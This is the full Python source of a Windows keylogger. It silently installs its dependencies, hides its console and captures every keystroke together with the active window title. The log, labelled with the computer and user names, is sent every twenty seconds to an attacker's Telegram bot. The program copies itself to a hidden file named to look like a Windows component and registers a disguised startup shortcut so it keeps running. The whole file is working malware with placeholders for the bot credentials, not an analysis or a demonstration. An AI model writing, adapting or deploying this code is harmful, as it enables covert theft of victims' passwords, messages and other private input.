import os
import sys
import subprocess
import time
import requests
import threading
import random
from datetime import datetime
import ctypes
import shutil

# Silent package installation
def install_packages():
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput", "requests", "--quiet", "--disable-pip-version-check"], 
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

install_packages()

from pynput import keyboard

# ================= CONFIG =================
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"
SEND_INTERVAL = 20
MAX_MSG_LEN = 4000
# =========================================

log = ""
last_send = time.time()
current_window = ""

def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def split_message(text):
    if len(text) <= MAX_MSG_LEN:
        return [text]
    messages = []
    while text:
        split_pos = text.rfind('\n', 0, MAX_MSG_LEN)
        if split_pos == -1:
            split_pos = MAX_MSG_LEN
        messages.append(text[:split_pos])
        text = text[split_pos:]
    return messages

def get_active_window():
    try:
        import win32gui
        hwnd = win32gui.GetForegroundWindow()
        if hwnd:
            title = win32gui.GetWindowText(hwnd)
            return title if title else "Unknown"
    except:
        pass
    return "Unknown"

def on_press(key):
    global log, current_window
    try:
        new_window = get_active_window()
        if new_window != current_window and new_window != "Unknown":
            current_window = new_window
            log += f"\n\n[WINDOW] {new_window}\n"
        
        if hasattr(key, 'char') and key.char is not None:
            log += key.char
        else:
            special = {
                'enter': '\n[ENTER]\n', 'space': ' ', 'backspace': '[BACK]',
                'tab': '[TAB]', 'shift': '[SHIFT]', 'ctrl': '[CTRL]',
                'alt': '[ALT]', 'esc': '[ESC]', 'up': '[UP]', 'down': '[DOWN]',
                'left': '[LEFT]', 'right': '[RIGHT]', 'caps_lock': '[CAPS]',
                'delete': '[DEL]', 'insert': '[INS]',
                'f1': '[F1]', 'f2': '[F2]', 'f3': '[F3]', 'f4': '[F4]',
                'f5': '[F5]', 'f6': '[F6]', 'f7': '[F7]', 'f8': '[F8]',
                'f9': '[F9]', 'f10': '[F10]', 'f11': '[F11]', 'f12': '[F12]',
                'cmd': '[WIN]', 'menu': '[MENU]', 'num_lock': '[NUM]',
                'scroll_lock': '[SCROLL]', 'pause': '[PAUSE]',
            }
            key_name = str(key).replace("Key.", "").lower()
            log += special.get(key_name, f'[{key_name.upper()}]')
    except:
        log += f'[{str(key)}]'

def send_logs():
    global log, last_send
    while True:
        if time.time() - last_send >= SEND_INTERVAL and log.strip():
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            header = f"🔑 KEYLOG - {timestamp}\nPC: {os.getenv('COMPUTERNAME')}\nUser: {os.getenv('USERNAME')}\n"
            full = header + log
            for msg in split_message(full):
                send_to_telegram(msg)
                time.sleep(1)
            log = ""
            last_send = time.time()
        time.sleep(5)

def add_to_startup():
    try:
        script_path = os.path.abspath(sys.argv[0])
        startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        lnk = os.path.join(startup, 'WindowsHost.lnk')
        
        vbs = f'''Set WshShell = CreateObject("WScript.Shell")
Set oShortcut = WshShell.CreateShortcut("{lnk}")
oShortcut.TargetPath = "{script_path}"
oShortcut.WorkingDirectory = "{os.path.dirname(script_path)}"
oShortcut.Save'''
        
        vbs_path = os.path.join(os.getenv('TEMP'), 'tmp.vbs')
        with open(vbs_path, 'w', encoding='utf-8') as f:
            f.write(vbs)
        subprocess.call(['cscript', vbs_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try: os.remove(vbs_path)
        except: pass
    except:
        pass

def self_persist():
    try:
        hidden_dir = os.path.join(os.getenv('APPDATA'), 'WindowsHost')
        os.makedirs(hidden_dir, exist_ok=True)
        hidden_path = os.path.join(hidden_dir, 'wuhost.exe')
        
        current = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
        
        if not os.path.exists(hidden_path) or os.path.getsize(hidden_path) < 500:
            shutil.copy2(current, hidden_path)
            subprocess.Popen([hidden_path], creationflags=subprocess.CREATE_NO_WINDOW)
            sys.exit(0)
    except:
        pass

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def main():
    hide_console()
    self_persist()
    add_to_startup()
    
    threading.Thread(target=send_logs, daemon=True).start()
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
